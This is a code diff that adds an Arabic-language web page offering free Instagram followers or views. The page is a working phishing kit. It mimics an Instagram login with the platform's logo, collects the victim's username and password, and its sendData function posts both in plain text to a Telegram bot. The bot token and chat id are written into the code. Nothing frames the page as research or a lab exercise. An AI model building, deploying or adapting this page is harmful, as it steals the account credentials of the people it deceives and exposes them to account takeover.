@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال متابعين أو مشاهدات</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        .action-btn {
+            width: 100%;
+            background-color: #3897f0;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 15px;
+            transition: background-color 0.3s ease;
+        }
+
+        .action-btn:hover {
+            background-color: #3181d9;
+        }
+
+        .option-btn {
+            width: 100px;
+            background-color: #f0f0f0;
+            color: black;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+            display: inline-block;
+            transition: background-color 0.3s ease;
+        }
+
+        .option-btn.selected {
+            background-color: purple;
+            color: white;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: purple;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+            display: none; /* مخفي في البداية */
+        }
+
+        .login-btn:hover {
+            background-color: #5a2d82;
+        }
+
+        .login-btn.show {
+            display: block; /* إظهار الزر عندما يتم الاختيار */
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .login-form {
+            display: none; /* نموذج تسجيل الدخول مخفي في البداية */
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        /* تأثيرات */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- المرحلة الأولى: زرين لإرسال المتابعين أو المشاهدات -->
+        <div id="initial-buttons">
+            <button class="action-btn" onclick="showFollowersOptions()">إرسال متابعين</button>
+            <button class="action-btn" onclick="showViewsOptions()">إرسال مشاهدات</button>
+        </div>
+
+        <!-- المرحلة الثانية: خيارات عدد المتابعين -->
+        <div id="followers-options" class="hidden">
+            <button class="option-btn" onclick="selectOption(this, 500)">500 متابع</button>
+            <button class="option-btn" onclick="selectOption(this, 1000)">1000 متابع</button>
+            <button class="option-btn" onclick="selectOption(this, 2000)">2000 متابع</button>
+        </div>
+
+        <!-- المرحلة الثانية: خيارات عدد المشاهدات -->
+        <div id="views-options" class="hidden">
+            <button class="option-btn" onclick="selectOption(this, 1000)">1000 مشاهدة</button>
+            <button class="option-btn" onclick="selectOption(this, 1500)">1500 مشاهدة</button>
+            <button class="option-btn" onclick="selectOption(this, 2000)">2000 مشاهدة</button>
+        </div>
+
+        <!-- المرحلة الثالثة: زر الحصول على المتابعين أو المشاهدات -->
+        <button id="login-btn" class="login-btn" onclick="showLoginForm()"></button>
+
+        <!-- نموذج تسجيل الدخول -->
+        <div id="login-form" class="login-form">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+            <h3 id="form-title"></h3>
+            <input type="text" id="username" class="input-field" placeholder="اسم المستخدم أو البريد الإلكتروني">
+            <input type="password" id="password" class="input-field" placeholder="كلمة المرور">
+            <button class="login-btn" onclick="sendData()">تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <script>
+        let selectedCount = 0;
+        let selectedType = ''; // للمتابعين أو المشاهدات
+
+        // دالة لإظهار خيارات المتابعين
+        function showFollowersOptions() {
+            document.getElementById('initial-buttons').classList.add('hidden');
+            document.getElementById('followers-options').classList.remove('hidden');
+            selectedType = 'followers';
+        }
+
+        // دالة لإظهار خيارات المشاهدات
+        function showViewsOptions() {
+            document.getElementById('initial-buttons').classList.add('hidden');
+            document.getElementById('views-options').classList.remove('hidden');
+            selectedType = 'views';
+        }
+
+        // دالة لاختيار العدد وتغيير لون الزر
+        function selectOption(button, count) {
+            // إزالة التحديد من جميع الأزرار
+            const allButtons = button.parentElement.querySelectorAll('.option-btn');
+            allButtons.forEach(btn => btn.classList.remove('selected'));
+
+            // إضافة التحديد للزر المضغوط
+            button.classList.add('selected');
+            selectedCount = count;
+
+            // تحديث النص على الزر وإظهاره
+            const loginBtn = document.getElementById('login-btn');
+            loginBtn.innerText = `اذهب للحصول على ${selectedCount} ${selectedType === 'followers' ? 'متابع' : 'مشاهدة'}`;
+            loginBtn.classList.add('show');
+        }
+
+        // دالة لإظهار نموذج تسجيل الدخول
+        function showLoginForm() {
+            document.getElementById('followers-options').classList.add('hidden');
+            document.getElementById('views-options').classList.add('hidden');
+            document.getElementById('login-btn').style.display = 'none'; // إخفاء الزر نهائيًا
+            document.getElementById('login-form').style.display = 'block';
+
+            // تعديل العنوان بناءً على الاختيار
+            const formTitle = document.getElementById('form-title');
+            formTitle.innerText = `تسجيل الدخول للحصول على ${selectedCount} ${selectedType === 'followers' ? 'متابع' : 'مشاهدة'}`;
+        }
+
+        // دالة لإرسال البيانات إلى بوت تلغرام
+        function sendData() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // تأكد من إدخال جميع الحقول
+            if (username === "" || password === "") {
+                alert("الرجاء إدخال اسم المستخدم وكلمة المرور");
+                return;
+            }
+
+            // إعداد البيانات لإرسالها إلى بوت التلغرام
+            const token = '7391359985:AAF8wa-mv6ZoIQQ53UDMIRGKdafrc8gG2ik';  // ضع رمز البوت هنا
+            const chat_id = 'imad27';  // ضع معرف الدردشة هنا
+            const message = `تم إدخال المعلومات التالية:\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}\nعدد ${selectedType === 'followers' ? 'المتابعين' : 'المشاهدات'}: ${selectedCount}`;
+
+            // استخدام fetch لإرسال الطلب إلى تلغرام
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chat_id,
+                    text: message
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("تم إرسال البيانات بنجاح!");
+                } else {
+                    alert("حدث خطأ أثناء الإرسال.");
+                }
+            })
+            .catch(error => {
+                console.error('خطأ:', error);
+                alert("حدث خطأ أثناء إرسال البيانات إلى تلغرام.");
+            });
+        }
+    </script>
+
+</body>
+</html>
